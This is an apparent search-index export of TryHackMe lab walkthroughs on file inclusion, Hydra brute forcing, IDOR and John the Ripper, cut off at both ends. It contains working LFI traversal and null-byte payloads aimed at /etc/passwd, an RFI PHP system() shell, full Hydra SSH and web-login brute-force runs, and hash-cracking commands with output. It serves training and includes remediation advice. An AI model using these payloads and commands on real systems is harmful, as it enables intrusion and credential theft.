<code>/etc/issue</code> Contains a message or system identification to be printed bore the login prompt. <code>/etc/profile</code> Controls system-wide default variables (such as Export variables), file creation mask (umask), terminal types, mail messages to indicate when new mail has arrived. <code>/proc/version</code> Specifies the version of the Linux kernel. <code>/etc/passwd</code> Contains all registered user who have access to the system. <code>/etc/shadow</code> Contains password hashes and other information regarding the user's on the system. <code>/root/.bash_history</code> Contains the history of commands for the root user. <code>/var/log/dmessage</code> Contains global system messages, including the messages that are logged during system startup. <code>/var/mail/root</code> Contains all emails for the root user. <code>/root/.ssh/id_rsa</code> Contains the private SSH keys for the root user or any known valid user on the server. <code>/var/log/apache2/access.log</code> Contains the accessed request logs for the Apache web server. <code>C:\\boot.ini</code> Contains the boot options for computers with BIOS firmware."},{"location":"walkthroughs/thm/fileinclusion/#task-4-local-file-inclusion-lfi","title":"Task 4 - Local File Inclusion (LFI)","text":"<p>LFI attacks against web applications are often due to a developer's lack of security awareness. Use of PHP functions such as <code>include</code>, <code>require</code>, <code>include_once</code>, and <code>require_once</code> often contribute to vulnerable web applications. LFI exploits follow the same concepts as path traversal.</p> <p>Let's look at a simple example. Suppose the web application provides the user with a choice of two languages <code>EN</code> and <code>AR</code> implemented on the backend with the following code:</p> <p><pre><code>&lt;?PHP\n    include($_GET[\"lang\"]);\n?&gt;\n</code></pre> The code above uses a <code>GET</code> request via the URL parameter <code>lang</code> to include the file of the page. The call can be made by making the following HTTP request:</p> <p><pre><code>http://webapp.thm/index.php?lang=EN.php\n\nor\n\nhttp://webapp.thm/index.php?lang=AR.php\n</code></pre> Theoretically, we can access an display any readable file on the server from the code above if there isn't any input validation. Suppose we want to read <code>/etc/passwd</code> file, we can try the following:</p> <pre><code>http://webapp.thm/index.php?lang=/etc/passwd\n</code></pre> <p>This works because in the PHP code above, there isn't a directory specified in the <code>include</code> function and no input validation is implemented. So what happens if the developer decides to specify a directory from where the files are accessed. The PHP code would look something like the following:</p> <p><pre><code>&lt;?PHP\n    include(\"languages/\".$_GET['lang']);\n?&gt;\n</code></pre> Here the developer used the <code>include</code> function to call PHP pages in the languages directory only via the <code>lang</code> parameter. If no input validation is implemented, we can manipulate the URL by replacing the <code>lang</code> input with other OS-sensitive files. The payload here looks similar to the path traversal attack. The exploit would be as follows:</p> <pre><code>http://webapp.thm/index.php?lang=../../../../../etc/passwd\n</code></pre>"},{"location":"walkthroughs/thm/fileinclusion/#task-5-local-file-inclusion-lfi-2","title":"Task 5 - Local File Inclusion - LFI #2","text":"<p>In this task, we will go deeper into LFI attacks. We will be performing black box testing and will be relying on errors to better understand how the data is passed and processed into the web application.</p>"},{"location":"walkthroughs/thm/fileinclusion/#nullbyte-bypass","title":"NullByte Bypass","text":"<p>Suppose we have the following entry point:</p> <p><pre><code>http://webapp.thm/index.php?lang=EN\n</code></pre> Now suppose we enter an invalid input such as THM and the application returns the following error:</p> <p><pre><code>Warning: include(languages/THM.php): failed to open stream: No such file or directory in /var/html/THM-4/index.php on line 12\n</code></pre> The error message discloses significant information. Most apparent is that the <code>include</code> function looks like <code>include(languages/THM.php);</code>. If we look at the directory closely, we can tell that the function includes files in the languages directory and adds <code>.php</code> at the end of the entry. This means that a valid entry will have a form similar to <code>index.php?lang=EN</code>, where <code>EN</code> is located inside the languages directory and the file is named EN.php.</p> <p>The error message also discloses the full directory path within which the application resides: <code>/var/www/html/THM-4</code>.</p> <p>We can exploit this part of the vulnerability by chaining a series of <code>../</code> to escape the directory and point to the resource that we are interesting in. However, note that the error message above also indicates that the backend code appends the <code>.php</code> extension after our query (ie: <code>THM.php</code>). So if we were to request something like <code>http://webapp.thm/index.php?lang=../../../../../etc/passwd</code>, the web server would return the following error:</p> <p><pre><code>Warning: include(languages/../../../../../etc/passwd.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12\n</code></pre> To bypass this scenario, we will need to use what is known as the <code>NULL BYTE</code> (ie: <code>%00</code>).</p> <p>Using NullByte is an injection technique where URL-encoded representations such as <code>%00</code> or <code>0x00</code> are used with user-supplied data to terminate strings. Essentially it is a way to tricking the web application into disregarding whatever comes after the NullByte.</p> <p>In our example, by adding the NullByte to the end of our payload, we tell the <code>include</code> function to ignore everything after the NullByte. The result would look something like the following:</p> <p><pre><code>include(\"languages/../../../../../etc/passwd%00\").\".php\");\n</code></pre> Which is equivalent to:</p> <p><pre><code>include(\"languages/../../../../../etc/passwd\");\n</code></pre> Typically, requests including the NullByte technique are performed from a browser's URL bar rather than from within the web application's form.</p> <p>NOTE: the <code>%00</code> technique is fixed and does not work in PHP 5.3.4 and above.</p>"},{"location":"walkthroughs/thm/fileinclusion/#keyword-filter-bypass","title":"Keyword Filter Bypass","text":"<p>Suppose the developer decided to implement filter keywords to avoid disclosing sensitive information. For example, assume the developer implemented a keyword filter which filters out the <code>/etc/passwd</code> file. There are two methods to bypass the filter. One method is to use the NullByte <code>%00</code> or the current directory trick at the end of the filtered keyword <code>/.</code>. The exploit would look like following:</p> <pre><code>http://webapp.thm/index.php?lang=/etc/passwd%00\n\nor\n\nhttp://webapp.thm/index.php?lang=/etc/passwd/.\n</code></pre>"},{"location":"walkthroughs/thm/fileinclusion/#input-validation-bypass","title":"Input Validation Bypass","text":"<p>Suppose the developer implements input validation filters. Suppose we try the query <code>http://webapp.thm/index.php?lang=../../../../etc/passwd</code> and are presented with the following error:</p> <p><pre><code>Warning: include(languages/etc/passwd): failed to open stream: No such file or directory in /var/www/html/THM-5/index.php on line 15\n</code></pre> Looking at the error message in the <code>include(languages/etc/passwd)</code> section, we see that the web application replaces our <code>../</code> with an empty string. In other words, the developer appears to have implemented a filter which looks for the <code>../</code> string and replaces it with an empty string. One of the common techniques to bypass a filter such as this is to chain <code>....//</code> instead. So our query would look something like <code>....//....//....//....//....//etc/passwd</code>.</p> <p>The reason this works is because PHP filter only matches and replaces the first subset string <code>../</code> it finds and doesn't do another pass resulting in:</p> <pre><code>flowchart TD\n    A[....//....//....//....//etc/passwd]--&gt;B[../../../../etc/passwd];</code></pre>"},{"location":"walkthroughs/thm/fileinclusion/#defined-directory-bypass","title":"Defined Directory Bypass","text":"<p>Let's discuss the case where the developer forces the <code>include</code> function to read from a defined directory. For example, if the web application asks user to supply an input that has to include a directory such as <code>http://webapp.thm/index.php?lang=languages/EN.php</code>, we can still use the directory traversal technique to trick the web application to access the resource we are pointing to. Our payload would look something like:</p> <pre><code>http://webapp.thm/index.php?lang=languages/../../../../../etc/passwd\n</code></pre>"},{"location":"walkthroughs/thm/fileinclusion/#task-6-remote-file-inclusion-rfi","title":"Task 6 - Remote File Inclusion - RFI","text":"<p>Remote File Inclusion (RFI) is a technique that includes remote files into a vulnerable application. Like LFI, RFI occurs when improper input sanitation is implemented thus allowing an attacker to inject an external URL into the <code>include</code> function of a PHP backend. One requirement for RFI is that the <code>allow_url_fopen</code> option in PHP needs to be enabled. </p> <p>The risk of RFI is higher than LFI since RFI vulnerabilities allow an attacker to gain Remote Command Execution (RCE) on the web server. Other consequences of a successful RFI attack include:</p> <ul> <li>Sensitive information disclosure</li> <li>Cross-site scripting (XSS)</li> <li>Denial of service (DoS)</li> </ul> <p>For a successful RFI attack, an external server must communicate with the application server. The malicious file is injected into the <code>include</code> function via HTTP requests and the contents of the malicious file executes on the vulnerable application server. The general process of RFI attack is illustrated below.</p> <p></p>"},{"location":"walkthroughs/thm/fileinclusion/#task-7-remediation","title":"Task 7 - Remediation","text":"<p>The following are some methods which can be used to mitigate file inclusion vulnerabilities:</p> <ol> <li>Key system and services, including web application frameworks, updated with the latest version.</li> <li>Turn off PHP errors to avoid leaking the path of the application and other potentially revealing information.</li> <li>A Web Application Firewall (WAF) is a good option to help mitigate web application attacks.</li> <li>Disable some PHP features that cause file inclusion vulnerabilities if your web application doesn't need them (ie: <code>allow_url_fopen</code> and <code>allow_url_include</code>).</li> <li>Carefully analyze the web application and allow only protocols and PHP wrappers that are needed.</li> <li>Never trust user input and make sure to implement proper input validation against file inclusion.</li> <li>Never implement whitelisting for file names and locations as well as blacklisting.</li> </ol>"},{"location":"walkthroughs/thm/fileinclusion/#task-8-challenge","title":"Task 8 - Challenge","text":"<p>Let's apply what we have learned so far.</p>"},{"location":"walkthroughs/thm/fileinclusion/#challenge-1","title":"Challenge #1","text":"<p>In this challenge, we are told that the input form is broken and that we need to send POST request with the file parameter.</p> <p>Let's do this through BurpSuite. With the proxies configured, let's capture the request.</p> <p></p> <p></p> <p>Let's change the HTTP request method from GET to POST and forward the packet.</p> <p></p> <p>After forwarding the request, the flag is displayed on the web application.</p> <p></p>"},{"location":"walkthroughs/thm/fileinclusion/#challenge-2","title":"Challenge 2","text":"<p>Opening the page, we are presented with an error prompting us to refresh the page. Once refreshed, the message changes to:</p> <p><pre><code>Welcome Guest!\nOnly admins can access this page!\n</code></pre> Let's intercept the request in BurpSuite and see what we are dealing with.</p> <p></p> <p>Looks like the the cookie field is set to <code>Guest</code>. Let's modify that to <code>Admin</code> and forward the request.</p> <p></p> <p>Note that the web application appends <code>.php</code> extension after our parameter value. We can bypass this by appending the NullByte to our request.</p> <p></p> <p>Forwarding the request retrieves the flag.</p> <p></p>"},{"location":"walkthroughs/thm/fileinclusion/#challenge-3","title":"Challenge 3","text":"<p>In challenge 3, we are presented with a web form with a dialog box where we can enter the file we wish to access. Let's try and access the <code>/etc/flag3</code> file.</p> <p></p> <p>It looks like the web application is implementing some sort of keyword filter which replaces our <code>/</code> with an empty string. Also note that the web application is apply a filter on numbers as the number <code>3</code> from our request is also replaced by an empty string. Furthermore, the application is appending the <code>.php</code> extension to our request.</p> <p>Let's intercept the request in BurpSuite.</p> <p></p> <p>Let's change the method from GET to POST and modify the file parameter to <code>../../../../etc/flag3%00</code>. Forward the request to retrieve the flag.</p> <p></p> <p></p>"},{"location":"walkthroughs/thm/fileinclusion/#rfi-challenge","title":"RFI Challenge","text":"<p>The RFI challenge requires us to execute the <code>hostname</code> command on the application server.</p> <p>Let's start by creating a malicious PHP file which we will remotely serve.</p> <p><pre><code>&lt;?php system(\"hostname\"); ?&gt;\n</code></pre> Save the above code as <code>shell.php</code> and serve it through a simple Python server on port 80.</p> <p>In the application, point the web application to the location of our malicious file.</p> <p></p> <p>Submit the request to have the application access our remote file and execute our payload.</p> <p></p> <p></p>"},{"location":"walkthroughs/thm/hydra/","title":"Hydra","text":""},{"location":"walkthroughs/thm/hydra/#reconosint","title":"Recon/OSINT","text":"<ul> <li>Target IP = 10.10.77.177</li> <li>Username: molly</li> </ul> <p>Checking out the source code for the webpage <code>10.10.77.177/login</code>:</p> <p><pre><code>&lt;!doctype html&gt;\n&lt;html lang=\"en\"&gt;\n  &lt;head&gt;\n    &lt;meta charset=\"utf-8\"&gt;\n&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, shrink-to-fit=no\"&gt;\n&lt;link rel=\"stylesheet\" href=\"/css/bootstrap.min.css\"&gt;\n&lt;title&gt;Hydra Challenge&lt;/title&gt;\n\n  &lt;/head&gt;\n  &lt;link href=\"/css/signin.css\" rel=\"stylesheet\"&gt;\n  &lt;body class=\"text-center\"&gt;\n    &lt;form class=\"form-signin\" action=\"/login\" method=\"post\"&gt;\n      &lt;a href='/'&gt;&lt;img class=\"mb-4\" style='width: 200px;' src=\"/img/herc.gif\" alt=\"\"&gt;&lt;/a&gt;\n      &lt;h1 class=\"h3 mb-3 font-weight-normal\"&gt;Login&lt;/h1&gt;\n\n      &lt;label for=\"inputEmail\" class=\"sr-only\"&gt;Username&lt;/label&gt;\n      &lt;input type=\"text\" name=\"username\" class=\"form-control\" placeholder=\"Username\" required autofocus&gt;\n      &lt;label for=\"inputPassword\" class=\"sr-only\"&gt;Password&lt;/label&gt;\n      &lt;input type=\"password\" name=\"password\" class=\"form-control\" placeholder=\"Password\" required&gt;\n      &lt;button class=\"btn btn-lg btn-primary btn-block\" type=\"submit\"&gt;Login&lt;/button&gt;\n      &lt;p class=\"mt-5 mb-3 text-muted\"&gt;&amp;copy; HydraSite 2012 - 2020&lt;/p&gt;\n    &lt;/form&gt;\n  &lt;/body&gt;\n  &lt;script src=\"/js/jquery.slim.min.js\"&gt;&lt;/script&gt;\n  &lt;script src=\"/js/popper.min.js\"&gt;&lt;/script&gt;\n  &lt;script src=\"/js/bootstrap.min.js\"&gt;&lt;/script&gt;\n&lt;/html&gt;\n</code></pre> The login fields are as follows:</p> <ul> <li>Method: POST</li> <li>Username: username</li> <li>Password: password</li> </ul>"},{"location":"walkthroughs/thm/hydra/#exploitation","title":"Exploitation","text":"<p>Using Hydra to brute-force Molly's web-login.</p> <p><pre><code>\u250c\u2500\u2500(siachen\u327fkali)-[/dev/shm]\n\u2514\u2500$ hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.77.177 http-post-form \"/login:username=^USER^&amp;password=^PASS^:F=Your username or password is incorrect\" -V -f\nHydra v9.4 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-12-06 11:19:07\n[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task\n[DATA] attacking http-post-form://10.10.77.177:80/login:username=^USER^&amp;password=^PASS^:F=Your username or password is incorrect\n[ATTEMPT] target 10.10.77.177 - login \"molly\" - pass \"123456\" - 1 of 14344399 [child 0] (0/0)\n[ATTEMPT] target 10.10.77.177 - login \"molly\" - pass \"12345\" - 2 of 14344399 [child 1] (0/0)\n[ATTEMPT] target 10.10.77.177 - login \"molly\" - pass \"123456789\" - 3 of 14344399 [child 2] (0/0)\n[ATTEMPT] target 10.10.77.177 - login \"molly\" - pass \"password\" - 4 of 14344399 [child 3] (0/0)\n[ATTEMPT] target 10.10.77.177 - login \"molly\" - pass \"iloveyou\" - 5 of 14344399 [child 4] (0/0)\n[ATTEMPT] target 10.10.77.177 - login \"molly\" - pass \"princess\" - 6 of 14344399 [child 5] (0/0)\n[ATTEMPT] target 10.10.77.177 - login \"molly\" - pass \"1234567\" - 7 of 14344399 [child 6] (0/0)\n[ATTEMPT] target 10.10.77.177 - login \"molly\" - pass \"rockyou\" - 8 of 14344399 [child 7] (0/0)\n[ATTEMPT] target 10.10.77.177 - login \"molly\" - pass \"12345678\" - 9 of 14344399 [child 8] (0/0)\n[ATTEMPT] target 10.10.77.177 - login \"molly\" - pass \"abc123\" - 10 of 14344399 [child 9] (0/0)\n[ATTEMPT] target 10.10.77.177 - login \"molly\" - pass \"nicole\" - 11 of 14344399 [child 10] (0/0)\n[ATTEMPT] target 10.10.77.177 - login \"molly\" - pass \"daniel\" - 12 of 14344399 [child 11] (0/0)\n[ATTEMPT] target 10.10.77.177 - login \"molly\" - pass \"babygirl\" - 13 of 14344399 [child 12] (0/0)\n[ATTEMPT] target 10.10.77.177 - login \"molly\" - pass \"monkey\" - 14 of 14344399 [child 13] (0/0)\n[ATTEMPT] target 10.10.77.177 - login \"molly\" - pass \"lovely\" - 15 of 14344399 [child 14] (0/0)\n[ATTEMPT] target 10.10.77.177 - login \"molly\" - pass \"jessica\" - 16 of 14344399 [child 15] (0/0)\n[ATTEMPT] target 10.10.77.177 - login \"molly\" - pass \"654321\" - 17 of 14344399 [child 7] (0/0)\n[ATTEMPT] target 10.10.77.177 - login \"molly\" - pass \"michael\" - 18 of 14344399 [child 8] (0/0)\n[ATTEMPT] target 10.10.77.177 - login \"molly\" - pass \"ashley\" - 19 of 14344399 [child 0] (0/0)\n[ATTEMPT] target 10.10.77.177 - login \"molly\" - pass \"qwerty\" - 20 of 14344399 [child 1] (0/0)\n[ATTEMPT] target 10.10.77.177 - login \"molly\" - pass \"111111\" - 21 of 14344399 [child 2] (0/0)\n[ATTEMPT] target 10.10.77.177 - login \"molly\" - pass \"iloveu\" - 22 of 14344399 [child 4] (0/0)\n[ATTEMPT] target 10.10.77.177 - login \"molly\" - pass \"000000\" - 23 of 14344399 [child 5] (0/0)\n[ATTEMPT] target 10.10.77.177 - login \"molly\" - pass \"michelle\" - 24 of 14344399 [child 3] (0/0)\n[ATTEMPT] target 10.10.77.177 - login \"molly\" - pass \"tigger\" - 25 of 14344399 [child 6] (0/0)\n[ATTEMPT] target 10.10.77.177 - login \"molly\" - pass \"sunshine\" - 26 of 14344399 [child 9] (0/0)\n[ATTEMPT] target 10.10.77.177 - login \"molly\" - pass \"chocolate\" - 27 of 14344399 [child 10] (0/0)\n[ATTEMPT] target 10.10.77.177 - login \"molly\" - pass \"password1\" - 28 of 14344399 [child 13] (0/0)\n[ATTEMPT] target 10.10.77.177 - login \"molly\" - pass \"soccer\" - 29 of 14344399 [child 15] (0/0)\n[ATTEMPT] target 10.10.77.177 - login \"molly\" - pass \"anthony\" - 30 of 14344399 [child 11] (0/0)\n[ATTEMPT] target 10.10.77.177 - login \"molly\" - pass \"friends\" - 31 of 14344399 [child 12] (0/0)\n[ATTEMPT] target 10.10.77.177 - login \"molly\" - pass \"butterfly\" - 32 of 14344399 [child 14] (0/0)\n[ATTEMPT] target 10.10.77.177 - login \"molly\" - pass \"purple\" - 33 of 14344399 [child 7] (0/0)\n[ATTEMPT] target 10.10.77.177 - login \"molly\" - pass \"angel\" - 34 of 14344399 [child 0] (0/0)\n[ATTEMPT] target 10.10.77.177 - login \"molly\" - pass \"jordan\" - 35 of 14344399 [child 2] (0/0)\n[ATTEMPT] target 10.10.77.177 - login \"molly\" - pass \"liverpool\" - 36 of 14344399 [child 15] (0/0)\n[ATTEMPT] target 10.10.77.177 - login \"molly\" - pass \"justin\" - 37 of 14344399 [child 12] (0/0)\n[ATTEMPT] target 10.10.77.177 - login \"molly\" - pass \"loveme\" - 38 of 14344399 [child 8] (0/0)\n[80][http-post-form] host: 10.10.77.177   login: molly   password: sunshine\n[STATUS] attack finished for 10.10.77.177 (valid pair found)\n1 of 1 target successfully completed, 1 valid password found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-12-06 11:19:16\n</code></pre> Using credentials <code>molly:sunshine</code> on the web-login page, flag 1 is: THM{2673a7dd116de68e85c48ec0b1f2612e}</p> <p>In order to find flag 2, we need to brute-force Molly's SSH password.</p> <p><pre><code>\u250c\u2500\u2500(siachen\u327fkali)-[~]\n\u2514\u2500$ hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.77.177 ssh   \nHydra v9.4 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-12-06 10:52:26\n[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\n[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task\n[DATA] attacking ssh://10.10.77.177:22/\n[22][ssh] host: 10.10.77.177   login: molly   password: butterfly\n1 of 1 target successfully completed, 1 valid password found\n[WARNING] Writing restore file because 4 final worker threads did not complete until end.\n[ERROR] 4 targets did not resolve or could not be connected\n[ERROR] 0 target did not complete\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-12-06 10:53:16\n</code></pre> Log in to SSH and retrieve flag 2:</p> <pre><code>\u250c\u2500\u2500(siachen\u327fkali)-[~]\n\u2514\u2500$ ssh molly@10.10.77.177   \nThe authenticity of host '10.10.77.177 (10.10.77.177)' can't be established.\nED25519 key fingerprint is SHA256:zZI2bUKvmMuaGDIM04ucCB7JERRXQGT8w98tuBlsH/Q.\nThis key is not known by any other names\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '10.10.77.177' (ED25519) to the list of known hosts.\nmolly@10.10.77.177's password: \nWelcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-1092-aws x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n65 packages can be updated.\n32 updates are security updates.\n\n\nLast login: Tue Dec 17 14:37:49 2019 from 10.8.11.98\nmolly@ip-10-10-77-177:~$ ls\nflag2.txt\nmolly@ip-10-10-77-177:~$ cat flag2.txt\nTHM{c8eeb0468febbadea859baeb33b2541b}\n</code></pre>"},{"location":"walkthroughs/thm/idor/","title":"IDOR","text":""},{"location":"walkthroughs/thm/idor/#what-are-insecure-direct-object-reference-vulnerabilities","title":"What are Insecure Direct Object Reference Vulnerabilities?","text":"<p>Insecure direct object reference (or IDOR) is a type of access control vulnerability that results when a web application uses a unique identifier for direct access to an internal object without additional access control or authentication checks.</p> <p>Exposed direct object references are not necessarily a security risk by themselves; however when combined with improper or insufficient access control, direct object references enable possibility of enumeration attacks which could lead to circumvention of poor access control measures. </p> <p>An IDOR vulnerability arises when the following conditions are satisfied:</p> <ol> <li>An application exposes a direct reference to an internal object or operation.</li> <li>A client can modify the object reference through manipulation of the URL via GET and POST parameters (URL Tampering) and/or form parameters (Body Manipulation).</li> <li>The application grants client access to the internal object without an authorization check.</li> </ol>"},{"location":"walkthroughs/thm/idor/#basis-of-an-idor-vulnerability-attack","title":"Basis of an IDOR Vulnerability Attack","text":"<p>Consider the following website with an access control vulnerability:</p> <p><pre><code>https://www.example.com/account?id=001\n</code></pre> In this case, the <code>id</code> parameter is used as an index in the id table in the database (ie. exposed direct object reference). When passed an appropriate value, the web application queries the internal database and returns relevant information to the client.</p> <p>Since the <code>id</code> parameter is used directly to query the database, an attacker can enumerate valid parameters to gain access to information associated with any other <code>id</code>. In our example, passing parameter <code>id=002</code> will result in the web application returning relevant information associated with that specific database index.</p> <p>As a result of this IDOR vulnerability, an attacker can perform horizontal privilege escalation attacks against the web application thereby accessing information they normally should not have access to. If the attacker is able to enumerate an <code>id</code>  associated with elevated privileges then a vertical privilege escalation is also possible.</p> <p>Note that direct object references do not necessarily need to be in plain-text as developers may opt to encode or encrypt them using myriad of encoding methods or encryption algorithms.</p> <p>It is worth mentioning that the most common type of IDOR vulnerabilities are associated with directory or path traversal which can permit an attacker to manipulate file system resources by allowing uploading or downloading of files and gain access to sensitive resources.</p>"},{"location":"walkthroughs/thm/idor/#practical-example-of-an-idor-attack","title":"Practical Example of an IDOR Attack","text":"<p>Consider the web application presented below.</p> <p></p> <p>The web application permits users to register new accounts by accessing the Customers section of the website. A common methodology to discover IDOR vulnerabilities is to create test accounts which can be used to enumerate the web application and aid in vulnerability discovery. In our example, we have registered a new user account which will server as a launching pad for further exploration.</p> <p></p> <p>Exploring the web application, we note that under the Your Account tab of the user's account, the current logged in user is permitted to change their username, email address, and password. Also note that the username and email fields are pre-populated which implies that the web application must be extracting this information from backend queries.</p> <p></p> <p>The developer tools available on most modern browsers can be used to investigate requests to and responses from the web server running the web application. Under the Network tab of developer tools, we observe a response for an endpoint with the path <code>/api/vi/customer?id=15</code>. The response from this endpoint contains the user's id, username, and email address in JSON format.</p> <p></p> <p>By modifying the <code>id</code> field, the web application can be coerced to return personal information of other user accounts bypassing any authentication checks.</p> <p></p> <p>The above was a simple example of how IDOR vulnerabilities can lead to exposure of sensitive information.</p>"},{"location":"walkthroughs/thm/idor/#preventing-idor-vulnerabilities","title":"Preventing IDOR Vulnerabilities","text":"<p>The best way to protect against possible IDOR vulnerabilities is through implementation of strict authorization and access control to validate and manage user access. Syntactic validation can also be employed to identify suspicious user inputs before the input is processed by the web server.</p> <p>Additionally, indirect reference mapping can be employed to avoid exposing direct object references. This allows substitution of direct object references with difficult to guess indirect references. The mapping between indirect references and direct references could then be maintained on a secure server. </p> <p>Alternatively, salted hashes can be used to replace direct object references. For more information, refer to Insecure Direct Object Reference Prevention on OWASP cheat Sheet Series on IDOR.</p>"},{"location":"walkthroughs/thm/johntheripper/","title":"John The Ripper","text":""},{"location":"walkthroughs/thm/johntheripper/#introduction","title":"Introduction","text":"<p>This room covers topics related to the use of John the Ripper to bruteforce hashes. Tasks 1, 2, and 3 cover basic background information on what John the Ripper is, how to install it, and the use of wordlists in conjunction with John to permit bruteforce attacks on hashes.</p> <p>Hashes related to the following tasks are stored at: <code>/home/siachen/CyberSec/THM/johntheripper/</code></p>"},{"location":"walkthroughs/thm/johntheripper/#cracking-basic-hashes","title":"Cracking Basic Hashes","text":"<p>Basic John the Ripper syntax is as follows:</p> <p><pre><code>john [options] [path to hash file]\n</code></pre> John has a built in feature which detects what type of hash it is being given and as such selects the appropriate rules and formats to crack the provided hash. This can however be unreliable as it is better to supply the format (type) of the hash John is working with. Format-specific cracking can be done using the following syntax:</p> <p><pre><code>john --format=[hash format/type] [path to hash file]\n</code></pre> Tools such as <code>hashid</code>, <code>hash-identifier</code>, or online hash identifiers can be used to identify the hash. Both of these tools come installed by default on Kali Linux.</p> <p>All supported hash formats can be listed out by using the following syntax:</p> <p><pre><code>john --list=formats\n</code></pre> Note that when dealing with a standard hash type like MD5, the hash format must be prefixed with <code>raw-</code> which tells John that the hash in question is a standard hash type.</p> <p>Finally, John needs to be supplied with a wordlist with which it can bruteforce the hashes with. The syntax to supply a wordlist to John is as follows:</p> <p><pre><code>john --wordlist=[path to wordlist] [path to hash file]\n</code></pre> Putting the above together, a typical syntax when using John to crack hashes is given as follows:</p> <p><pre><code>john --format=[hash format/type] --wordlist=[path to wordlist] [path to hash file]\n</code></pre> With this knowledge, we can begin cracking some basic hashes.</p>"},{"location":"walkthroughs/thm/johntheripper/#question-1-what-type-of-hash-is-in-hash1txt","title":"Question 1 - What type of hash is in hash1.txt?","text":"<p>Using an online hash identifier tool reveals the hash to be MD5.</p>"},{"location":"walkthroughs/thm/johntheripper/#question-2-what-is-the-cracked-value-of-hash1txt","title":"Question 2 - What is the cracked value of hash1.txt?","text":"<pre><code>\u250c\u2500\u2500(siachen\u327fkali)-[~/CyberSec/THM/johntheripper/task_four_hashes]\n\u2514\u2500$ john --format=raw-md5 --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash1.txt \nUsing default input encoding: UTF-8\nLoaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])\nWarning: no OpenMP support for this hash type, consider --fork=4\nPress 'q' or Ctrl-C to abort, almost any other key for status\nbiscuit          (?)     \n1g 0:00:00:00 DONE (2023-02-28 21:40) 16.66g/s 44800p/s 44800c/s 44800C/s shamrock..nugget\nUse the \"--show --format=Raw-MD5\" options to display all of the cracked passwords reliably\nSession completed. \n</code></pre>"},{"location":"walkthroughs/thm/johntheripper/#question-3-what-type-of-hash-is-hash2txt","title":"Question 3 - What type of hash is hash2.txt?","text":"<p>Using the online hash identification tool, the most probable hash type is SHA1.</p>"},{"location":"walkthroughs/thm/johntheripper/#question-4-what-is-the-cracked-value-of-hash2txt","title":"Question 4 - What is the cracked value of hash2.txt?","text":"<pre><code>\u250c\u2500\u2500(siachen\u327fkali)-[~/CyberSec/THM/johntheripper/task_four_hashes]\n\u2514\u2500$ john --format=raw-sha1 --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash2.txt\nUsing default input encoding: UTF-8\nLoaded 1 password hash (Raw-SHA1 [SHA1 128/128 AVX 4x])\nWarning: no OpenMP support for this hash type, consider --fork=4\nPress 'q' or Ctrl-C to abort, almost any other key for status\nkangeroo         (?)     \n1g 0:00:00:00 DONE (2023-02-28 21:43) 10.00g/s 1171Kp/s 1171Kc/s 1171KC/s kangeroo..kalinda\nUse the \"--show --format=Raw-SHA1\" options to display all of the cracked passwords reliably\nSession completed.\n</code></pre>"},{"location":"walkthroughs/thm/johntheripper/#question-5-what-type-of-hash-is-hash3txt","title":"Question 5 - What type of hash is hash3.txt?","text":"<p>Verifying with online hash identification tool reveals most probable hash type is SHA256.</p>"},{"location":"walkthroughs/thm/johntheripper/#question-6-what-is-the-cracked-value-of-hash3txt","title":"Question 6 - What is the cracked value of hash3.txt?","text":"<pre><code>\u250c\u2500\u2500(siachen\u327fkali)-[~/CyberSec/THM/johntheripper/task_four_hashes]\n\u2514\u2500$ john --format=raw-sha256 --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash3.txt\nUsing default input encoding: UTF-8\nLoaded 1 password hash (Raw-SHA256 [SHA256 128/128 AVX 4x])\nWarning: poor OpenMP scalability for this hash type, consider --fork=4\nWill run 4 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nmicrophone       (?)     \n1g 0:00:00:00 DONE (2023-02-28 21:48) 16.66g/s 1638Kp/s 1638Kc/s 1638KC/s rozalia..Dominic1\nUse the \"--show --format=Raw-SHA256\" options to display all of the cracked passwords reliably\nSession completed. \n</code></pre>"},{"location":"walkthroughs/thm/johntheripper/#question-7-what-type-of-hash-is-hash4txt","title":"Question 7 - What type of hash is hash4.txt?","text":"<p>Using the online hash identification tool, the most likely hash type is Whirlpool.</p>"},{"location":"walkthroughs/thm/johntheripper/#question-8-what-is-the-cracked-value-of-hash4txt","title":"Question 8 - What is the cracked value of hash4.txt?","text":"<pre><code>\u250c\u2500\u2500(siachen\u327fkali)-[~/CyberSec/THM/johntheripper/task_four_hashes]\n\u2514\u2500$ john --format=whirlpool --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash4.txt\nUsing default input encoding: UTF-8\nLoaded 1 password hash (whirlpool [WHIRLPOOL 32/64])\nWarning: poor OpenMP scalability for this hash type, consider --fork=4\nWill run 4 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\ncolossal         (?)     \n1g 0:00:00:00 DONE (2023-02-28 21:57) 2.000g/s 1359Kp/s 1359Kc/s 1359KC/s davist..chata1994\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession 